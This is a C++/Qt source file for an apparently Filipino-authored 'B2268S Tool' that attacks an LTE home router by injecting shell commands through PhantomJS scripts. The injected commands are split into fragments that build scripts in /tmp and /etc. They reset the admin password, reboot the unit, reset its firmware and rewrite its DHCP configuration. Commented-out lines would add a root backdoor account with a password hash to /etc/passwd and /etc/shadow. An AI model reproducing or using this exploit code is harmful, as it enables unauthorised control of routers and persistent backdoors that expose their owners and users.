#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QTime>
#include <QDesktopServices>
#include <QMessageBox>

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{

    QString temp=QString::fromLocal8Bit( qgetenv("temp").constData() );
    temp = temp + "/rthfhfd-adfgyhjfhng-dfhrthsdfh-adfgh.tmp/";
    temp.replace("\\","/");

    setWindowFlags(Qt::Widget | Qt::FramelessWindowHint);
    setParent(0); // Create TopLevel-Widget
    setAttribute(Qt::WA_NoSystemBackground, true);
    setAttribute(Qt::WA_TranslucentBackground, true);

    ui->setupUi(this);

    ui->progressBar->setValue(0);
    ui->textEdit->setReadOnly(true);

    ui->lineEdit->setValidator( new QIntValidator(0, 100, this) );


    connect(ui->webView, SIGNAL(loadStarted()), this, SLOT(init()));

    //QUrl tweeter("file:///"+temp+"/asd.html");
    //ui->webView->load(tweeter);

    QList<QHostAddress> ipAddressesList = QNetworkInterface::allAddresses();
    // use the first non-localhost IPv4 address
    for (int i = 0; i < ipAddressesList.size(); ++i) {
        qDebug() << ipAddressesList.at(i).toString();
        if (ipAddressesList.at(i) != QHostAddress::LocalHost &&
            ipAddressesList.at(i).toIPv4Address()) {
            ipaddress = ipAddressesList.at(i).toString();
            if(ipaddress.startsWith("192.168.15.")){
                break;
            }
        }
    }

    //ipaddress="bug fixed";

    phantomjs = temp + "phantomjs.exe";
    b2268s = temp + "root.js";
    host << "--ignore-ssl-errors=true" << temp + "host.js" << ipaddress;
    counthost << "--ignore-ssl-errors=true" << temp + "counthost.js" << ipaddress;
    login << "--ignore-ssl-errors=true" << temp + "login.js";
    arguments << "--ignore-ssl-errors=true" << b2268s << ipaddress;



    /* create QProcess object */
    proc = new QProcess();

    /* show output */
    connect(proc, SIGNAL(readyReadStandardOutput()),this, SLOT(rightMessage()) );
    connect(proc, SIGNAL(readyReadStandardError()), this, SLOT(wrongMessage()) );
    connect(proc, SIGNAL(finished(int)), this, SLOT(ping()) );
    connect(ui->lineEdit, SIGNAL(returnPressed()), this, SLOT(click_save()));
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::on_pushButton_clicked()
{
        clicked = 1;
        alert = "Admin access granted!<br>username: <b>admin</b> password: <b>admin</b>";
        /* clear text report */
       // ui->textEdit->clear();
        cmds.clear();
        cmds << ";echo '#!/bin/sh' >/tmp/b ;"
             /*<< ";echo -n echo Red >>/tmp/b ;"
             << ";echo -n Sec >>/tmp/b ;"
             << ";echo -n :x:0:0:re >>/tmp/b ;"
             << ";echo -n d,,,:/roo >>/tmp/b ;"
             << ";echo -n t:/bin/s >>/tmp/b ;"
             << ";echo -n 'h >>' >>/tmp/b ;"
             << ";echo /etc/passwd >>/tmp/b ;"
             << ";echo -n \"echo '\" >>/tmp/b ;"
             << ";echo -n RedSec >>/tmp/b ;"
             << ";echo -n ':$1$EMR' >>/tmp/b ;"
             << ";echo -n 'tFl3T$T' >>/tmp/b ;"
             << ";echo -n XsoG/CwvK >>/tmp/b ;"
             << ";echo -n .1Ds.Imxf >>/tmp/b ;"
             << ";echo -n i.0:13013 >>/tmp/b ;"
             << ";echo -n :0:99999: >>/tmp/b ;"
             << ";echo -n \"7:::' \" >>/tmp/b ;"
             << ";echo -n '>>' >>/tmp/b ;"
             << ";echo -n /etc/shad >>/tmp/b ;"
             << ";echo ow >>/tmp/b ;"*/
             << ";echo \"admin:admin\" >/tmp/c ;"
             //<< ";echo -n RedSec >>/tmp/c ;"
             //<< ";echo -n :RedSe >>/tmp/c ;"
             //<< ";echo -n c >>/tmp/c ;"
             << ";echo -n chpass >>/tmp/b;"
             << ";echo -n wd >>/tmp/b;"
             << ";echo -n ' < ' >>/tmp/b;"
             << ";echo -n /tmp/c >>/tmp/b;"
             << ";chmod 777 /tmp/b ;"
             << ";/tmp/b ;"
             << ";rm /tmp/b ;"
             << ";rm /tmp/c ;";

        loading = 0;

        ui->textEdit->append("<b>Unlocking admin access...</b>");

        proc->start(phantomjs, login);
        ui->pushButton->setEnabled(false);
        ui->pushButton_3->setEnabled(false);
        ui->pushButton_2->setEnabled(false);
        ui->pushButton_6->setEnabled(false);
}

void MainWindow::rightMessage()
{
    QByteArray strdata = proc->readAllStandardOutput();
    ui->statusBar->showMessage(strdata);
    if(identify == 0 && counting == 1){
        count = strdata; //for identifying hosts
        counting = 0;
    }else if(clicked==1){

    }else{
        ui->textEdit->append(strdata);
    }
}

void MainWindow::wrongMessage()
{
    QByteArray strdata = proc->readAllStandardOutput();
    ui->textEdit->append(strdata);
}

void MainWindow::ping()
{
    if(clicked == 1){
    if (nextcmd <= cmds.size()-1){
            qDebug() << nextcmd;
            qDebug() << cmds.size();
            QStringList args = arguments;
            args << cmds.at(nextcmd);
            proc->start(phantomjs, args);
            nextcmd++;
            ui->progressBar->setValue(loading);
            loading =  loading + (100 / cmds.size());
    }else{
        ui->textEdit->append(alert);
        ui->textEdit->append("");
        //ui->statusBar->showMessage(alert, 7000);
        ui->pushButton->setEnabled(true);
        ui->pushButton_2->setEnabled(true);
        ui->pushButton_3->setEnabled(true);
        ui->pushButton_6->setEnabled(true);
        ui->lineEdit->setEnabled(true);
        nextcmd = 0;
        clicked = 0;
        ui->progressBar->setValue(100);
    }
    }

    if(identify == 1){
        proc->start(phantomjs, counthost);
        identify = 0;
        counting = 1;
    }
    if(counting == 0 && identify == 0 && count != "putang ina mo"){
        proc->start(phantomjs, host << count);
        count = "putang ina mo";
        ui->pushButton_7->setEnabled(true);
        ui->textEdit->append("Done Scanning...");
    }
}

void MainWindow::init()
{
    ui->textEdit->append("<b>B2268S Tool</b> v1.00 by Android 20\n");
    ui->textEdit->append("");
    ui->textEdit->append("");
    QByteArray splash("Ang official hashtag po natin ay ");
    for (int i = 0; i < splash.size(); ++i) {
        delay(77);
        ui->textEdit->moveCursor (QTextCursor::End);
        ui->textEdit->insertPlainText(QString(splash.at(i)));
    }
    ui->textEdit->insertHtml("<b><font color='yellow'>#pwnBro</font></b> ");
    ui->textEdit->append("");
    ui->textEdit->append("");
    QByteArray splash2("Features: -Unlock admin access -Set dhcp pool size -Reboot ODU -Reset ODU Firmware -View connected hosts on network -Ping router and ODU");
    for (int i = 0; i < splash2.size(); ++i) {
        delay(7);
        ui->textEdit->moveCursor (QTextCursor::End);
        if(splash2.at(i)=='-')
            ui->textEdit->append("");
        ui->textEdit->insertPlainText(QString(splash2.at(i)));
    }
    ui->textEdit->append("");
    QByteArray splash1("For more information, click ");
    for (int i = 0; i < splash1.size(); ++i) {
        delay(7);
        ui->textEdit->moveCursor (QTextCursor::End);
        ui->textEdit->insertPlainText(QString(splash1.at(i)));
    }
    ui->textEdit->insertHtml("<b><font color='yellow'>B2268S Tool</font></b> ");
    ui->textEdit->append("");
    ui->textEdit->append("");
    ui->webView->setEnabled(true);
}

void MainWindow::click_save()
{
    ui->textEdit->append("Click save...");
    ui->textEdit->append("");
}

void MainWindow::delay( int millisecondsToWait )
{
    QTime dieTime = QTime::currentTime().addMSecs( millisecondsToWait );
    while( QTime::currentTime() < dieTime )
    {
        QCoreApplication::processEvents( QEventLoop::AllEvents, 100 );
    }
}

int MainWindow::randInt(int low, int high)
{
// Random number between low and high
return qrand() % ((high + 1) - low) + low;
}


void MainWindow::on_pushButton_4_clicked()
{
    proc->start("ping", QStringList() << "192.168.15.1");
}

void MainWindow::on_pushButton_5_clicked()
{
    proc->start("ping", QStringList() << "169.254.9.217");
}

void MainWindow::on_pushButton_2_clicked()
{
    clicked = 1;
    loading =0;
    alert = "Done Rebooting...";
    cmds.clear();
    cmds << ";echo '#!/bin/sh' >/tmp/b ;"
    << ";echo -n '/var/LTE' >>/tmp/b;"
    << ";echo -n 'Reset.sh' >>/tmp/b;"
    << ";chmod 777 /tmp/b ;"
    << ";/tmp/b ;"
    << ";rm /tmp/b ;" ;

    ui->textEdit->append("<b>Rebooting Outdoor Unit...</b>");

    ui->pushButton->setEnabled(false);
    ui->pushButton_2->setEnabled(false);
    ui->pushButton_3->setEnabled(false);
    ui->pushButton_6->setEnabled(false);

    proc->start(phantomjs, login);


}

void MainWindow::on_pushButton_7_clicked()
{
    ui->pushButton_7->setEnabled(false);
    identify = 1;
    counting = 0;
    count = "putang ina mo";
    proc->start(phantomjs,login);
    ui->textEdit->append("<b>Scanning hosts...</b>");
}

void MainWindow::on_pushButton_3_clicked()
{
    clicked = 1;
    loading =0;
    alert = "ODUFW Reset...";
    cmds.clear();
    cmds << ";echo '#!/bin/sh' >/tmp/b ;"
    << ";echo -n '/etc/doR' >>/tmp/b;"
    << ";echo -n 'ecovery.' >>/tmp/b;"
    << ";echo -n 'sh' >>/tmp/b;"
    << ";chmod 777 /tmp/b ;"
    << ";/tmp/b ;"
    << ";rm /tmp/b ;" ;

    QMessageBox msgBox;
    msgBox.setText("Reset ODU Firmware");
    msgBox.setInformativeText("Sure ka?");
    msgBox.setStandardButtons(QMessageBox::Yes | QMessageBox::No);
    msgBox.setDefaultButton(QMessageBox::No);
    int ret = msgBox.exec();
    qDebug() << ret;

    if(ret == 16384){
    ui->textEdit->append("<b>Resetting Firmware...</b>");
    //ui->textEdit->append("<b><font color='yellow'>Warning: Nd ko pa ito natry bahala ka kung gusto mo talga e reset!</font></b>");

    ui->pushButton->setEnabled(false);
    ui->pushButton_2->setEnabled(false);
    ui->pushButton_3->setEnabled(false);
    ui->pushButton_6->setEnabled(false);



    proc->start(phantomjs, login);
    }
}

void MainWindow::on_pushButton_6_clicked()
{
    if(ui->lineEdit->text() != ""){
    clicked = 1;
    loading =0;
    alert = "DHCP Pool Size configured to = "+ui->lineEdit->text();
    cmds.clear();
    cmds << ";echo '#!/bin/sh' >/etc/b ;"
    << ";echo -n \"sed -i '\" >>/etc/b;"
    << ";echo -n 's/dhcp-l' >>/etc/b;"
    << ";echo -n 'ease-max' >>/etc/b;"
    << ";echo -n '=.*/dhcp' >>/etc/b;"
    << ";echo -n '-lease-m' >>/etc/b;"
    << ";echo -n \"ax="+ui->lineEdit->text()+"/g'\" >>/etc/b;"
    << ";echo -n ' /etc/dn' >>/etc/b;"
    << ";echo -n 'smasq.co' >>/etc/b;"
    << ";echo 'nf' >>/etc/b;"
    << ";echo -n \"sed -i '\" >>/etc/b;"
    << ";echo -n 's/dhcp-r' >>/etc/b;"
    << ";echo -n 'ange=192' >>/etc/b;"
    << ";echo -n '.168.15.' >>/etc/b;"
    << ";echo -n '2,192.16' >>/etc/b;"
    << ";echo -n '8.15.8,2' >>/etc/b;"
    << ";echo -n '55.255.2' >>/etc/b;"
    << ";echo -n '55.0,864' >>/etc/b;"
    << ";echo -n '00/dhcp-' >>/etc/b;"
    << ";echo -n 'range=19' >>/etc/b;"
    << ";echo -n '2.168.15' >>/etc/b;"
    << ";echo -n '.2,192.1' >>/etc/b;"
    << ";echo -n '68.15.10' >>/etc/b;"
    << ";echo -n '0,255.25' >>/etc/b;"
    << ";echo -n '5.255.0,' >>/etc/b;"
    << ";echo -n \"86400/g'\" >>/etc/b;"
    << ";echo -n ' /etc/dn' >>/etc/b;"
    << ";echo -n 'smasq.co' >>/etc/b;"
    << ";echo -n 'nf'>>/etc/b;"
    << ";chmod 777 /etc/b ;"
    << "; /etc/b ;"
    << ";rm /etc/b ;" ;

    ui->textEdit->append("<b>Configuring dhcp pool size to "+ui->lineEdit->text()+"...</b>");

    ui->pushButton->setEnabled(false);
    ui->pushButton_2->setEnabled(false);
    ui->pushButton_3->setEnabled(false);
    ui->pushButton_6->setEnabled(false);
    ui->lineEdit->setEnabled(false);

    proc->start(phantomjs, login);
    }else{
        ui->textEdit->append("Warning: <b>enter size 1-99</b>");
        ui->textEdit->append("");
    }
}


void MainWindow::on_actionAbout_triggered()
{
    QByteArray splash1("Features: -Unlock admin access * broadband * NAT * Dynamic DNS * Firewall * Parental Control * L2TP VPN * GRE VPN * SIP * Log * User Account * System * Log Settings * Software Upgrade * Backup/Restore * Note: username: admin password:admin -Set dhcp pool size * Palitan ung 7 lang na maximum na device na pweding mgconnect sa network or wifi. -Reboot ODU * Reboot ung outdoor unit. -Reset ODU Firmware * Reset ung firmware ng outdoor unit * Note: not tested ko pa to kaya bahala ka na lang kung gusto mo e try -View connected hosts on network * Makikita mo ung mga device na nakaconnect sa internet/wifi pati ung ip at mac nila -Ping router and ODU * Ping kung connected si router 192.168.15.1 or ung ODU 169.254.9.217");
    for (int i = 0; i < splash1.size(); ++i) {
        delay(7);
        ui->textEdit->moveCursor (QTextCursor::End);
        if(splash1.at(i)=='-')
            ui->textEdit->append("");
        if(splash1.at(i)!='*'){
            ui->textEdit->insertPlainText(QString(splash1.at(i)));
        }else{
            ui->textEdit->append(" ");
        }
    }
    ui->textEdit->append("");
    QByteArray splash2("NOTE: Pag nireset or pinatay ung unit, reset din po ung admin access pati ung dhcp settings.");
    for (int i = 0; i < splash2.size(); ++i) {
        delay(7);
        ui->textEdit->moveCursor (QTextCursor::End);
        ui->textEdit->insertPlainText(QString(splash2.at(i)));
    }
    ui->textEdit->append("");
    ui->textEdit->append("");
}

void MainWindow::on_actionAbout_B2268S_Tool_triggered()
{
    QByteArray splash("Project: B2268S Tool");
    for (int i = 0; i < splash.size(); ++i) {
        delay(7);
        ui->textEdit->moveCursor (QTextCursor::End);
        ui->textEdit->insertPlainText(QString(splash.at(i)));
    }
    ui->textEdit->append("");
    QByteArray splash1("Version: 1.00");
    for (int i = 0; i < splash1.size(); ++i) {
        delay(7);
        ui->textEdit->moveCursor (QTextCursor::End);
        ui->textEdit->insertPlainText(QString(splash1.at(i)));
    }
    ui->textEdit->append("");
    QByteArray splash2("Author: Android 20");
    for (int i = 0; i < splash2.size(); ++i) {
        delay(7);
        ui->textEdit->moveCursor (QTextCursor::End);
        ui->textEdit->insertPlainText(QString(splash2.at(i)));
    }
    ui->textEdit->append("");
    ui->textEdit->append("");
}

void MainWindow::on_actionClose_triggered()
{
    MainWindow::close();
}

void MainWindow::on_actionAbout_RedSec_triggered()
{
    QByteArray splash("Age: 21");
    for (int i = 0; i < splash.size(); ++i) {
        delay(7);
        ui->textEdit->moveCursor (QTextCursor::End);
        ui->textEdit->insertPlainText(QString(splash.at(i)));
    }
    ui->textEdit->append("");
    QByteArray splash1("Sex: Male");
    for (int i = 0; i < splash1.size(); ++i) {
        delay(7);
        ui->textEdit->moveCursor (QTextCursor::End);
        ui->textEdit->insertPlainText(QString(splash1.at(i)));
    }
    ui->textEdit->append("");
    QByteArray splash2("Location: ph");
    for (int i = 0; i < splash2.size(); ++i) {
        delay(7);
        ui->textEdit->moveCursor (QTextCursor::End);
        ui->textEdit->insertPlainText(QString(splash2.at(i)));
    }
    ui->textEdit->append("");
    QByteArray splash3("Twitter: ");
    for (int i = 0; i < splash3.size(); ++i) {
        delay(7);
        ui->textEdit->moveCursor (QTextCursor::End);
        ui->textEdit->insertPlainText(QString(splash3.at(i)));
    }
    ui->textEdit->insertHtml("<b><font color='yellow'>@androidbente</font></b> ");
    ui->textEdit->append("");
    ui->textEdit->append("");
}


void MainWindow::on_actionUpdates_triggered()
{
    ui->textEdit->append("Opening in your default browser...");
    ui->textEdit->append("");
    QString link = "http://www.symbianize.com/showthread.php?t=1313223&p=21606296#post21606296";
    QDesktopServices::openUrl(QUrl(link));

}
